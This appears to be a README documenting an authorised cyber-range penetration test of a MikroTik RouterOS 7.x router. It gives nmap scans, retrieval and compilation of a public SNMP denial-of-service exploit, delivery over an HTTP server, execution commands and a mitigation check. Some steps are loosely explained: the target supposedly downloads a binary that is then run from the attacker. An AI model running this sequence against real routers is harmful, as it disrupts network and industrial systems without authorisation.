# 🔒 MikroTik RouterOS ICS Security Penetration Test

This repository documents a controlled cyber range exercise focused on penetration testing a **MikroTik RouterOS 7.x** device in an Industrial Control Systems (ICS) environment. The goal: **reconnaissance → exploit (SNMP) → verify remediation (OpSec verification)**.

> **Important:** This material documents a controlled, authorized exercise. Use only in environments where you have explicit permission to test.

## Overview

This guide captures commands and notes from an internal exercise where a MikroTik RouterOS device was identified and tested for an SNMP-related denial-of-service exploit. The exercise demonstrates typical penetration test phases: reconnaissance, enumeration, exploit preparation, execution, and verification of mitigation.

---

## Roles & IP Addresses

| Role             | IP Address    | Notes                                |
| ---------------- | ------------- | ------------------------------------ |
| Attacker Machine | `10.13.20.91` | Source IP for launching the exploit. |
| Target Router    | `10.13.20.16` | MikroTik RouterOS 7.x (identified).  |

---

## Phase 1 — Reconnaissance and Network Mapping

Initial steps to confirm attacker network configuration and discover hosts in the `10.13.20.0/24` subnet.

### 1.1 Check Attacker Network Configuration

**Commands and purpose:**

| Command        | Purpose                                      |
| -------------- | -------------------------------------------- |
| `ifconfig`     | Display network interfaces and IP addresses. |
| `ip addr show` | Display IP address and interface details.    |

```bash
# Example: list network interfaces (Linux)
ifconfig

# or
ip addr show
```

---

### 1.2 Host Discovery Scan

Use Nmap to perform a ping scan of the subnet.

```bash
# Ping sweep to find live hosts
nmap -sn 10.13.20.0/24
```

---

## Phase 2 — Target Enumeration & Vulnerability Identification

After identifying `10.13.20.16` as a host, a deeper scan was run to enumerate services and the OS.

### 2.1 Aggressive Port and OS/Service Scan

```bash
# Aggressive scan for services, OS detection, and version detection (target: 10.13.20.16)
nmap -p 22,5000,8080,502,1502,2502 -A -sV -O -Pn -T4 10.13.20.16
```

> Result: Device fingerprinted as **MikroTik RouterOS 7.x**.

---

### 2.2 Search for Exploits

Search public exploit databases (Exploit-DB / searchsploit) for MikroTik RouterOS 7 vulnerabilities.

```bash
# Search exploit-db for MikroTik RouterOS 7
searchsploit mikrotik routeros 7
```

> Example finding: SNMP SET Denial of Service exploit among other entries.

---

### 2.3 Download Exploit Source Code

Copy the exploit source (example: `31102.c`) locally for review/compilation.

```bash
# Mirror (copy) exploit to local directory
searchsploit -m exploits/hardware/dos/31102.c
```

---

## Phase 3 — Exploit Preparation & Delivery

Compile the exploit and make it available for the target to download (simulating a delivery step in the controlled lab).

### 3.1 Review and Compile the Exploit

**Commands and purposes:**

| Command                          | Purpose                                         |
| -------------------------------- | ----------------------------------------------- |
| `nano 31102.c`                   | Open and review the C source file.              |
| `gcc 31102.c -o exploit_binary1` | Compile the C source into an executable binary. |

```bash
# Open exploit source
nano 31102.c

# Compile
gcc 31102.c -o exploit_binary1
```

---

### 3.2 Host and Transfer the Exploit

Host the compiled binary with a temporary HTTP server for download.

```bash
# Start a simple Python HTTP server on port 8080
python3 -m http.server 8080
```

> Server logs indicated `10.13.20.16` successfully downloaded the file (exercise log).

---

## Phase 4 — Exploitation & Post-Exploitation

Execute the compiled exploit against the target's SNMP service and demonstrate a basic post-exploitation transfer step (OpSec example).

### 4.1 Execute Exploit Binary

Attempt to run the exploit locally, specifying source/destination and SNMP community string.

```bash
# Initial (non-root) attempt (failed due to privileges)
./exploit_binary1 -s 10.13.20.91 -d 10.13.20.16 -c public

# Run as root (succeeds in sending packets; indicates SNMP daemon must be down on target)
sudo ./exploit_binary1 -s 10.13.20.91 -d 10.13.20.16 -c public
```

**Notes:**

* First run failed because of insufficient privileges.
* Running with `sudo` successfully sent packets — exercise logs indicate SNMPd was not running (or had been disabled) at the time of the run.

---

### 4.2 Secure File Copy (OpSec Example)

Example of copying a file (`app.py`) to another host as part of simulation post-exploitation workflow.

```bash
# Secure copy to a separate host (example)
scp app.py student@10.14.7.18:docker/substation-envsim/
```

---

## Phase 5 — Operational Security (OpSec) Verification

Confirm the vulnerable vector (SNMP on UDP/161) is no longer available after mitigation.

### 5.1 Verify SNMP Service State

Scan UDP port 161 on the target to confirm it is closed.

```bash
# Scan UDP port 161 (SNMP) on the target to verify mitigation
sudo nmap -sU -p 161 10.13.20.16
```

**Verification Result:**
`161/udp closed  snmp` — shows the SNMP port is closed; mitigation successful in disabling the primary exploit vector.

---

## Notes & References

* Target and exploit details are recorded from a controlled, authorized cyber range exercise.
* Always obtain explicit, written authorization before performing any penetration testing or active scanning on networks or devices you do not own.
* This README preserves the original commands and sequence used during the exercise for repeatability and documentation.

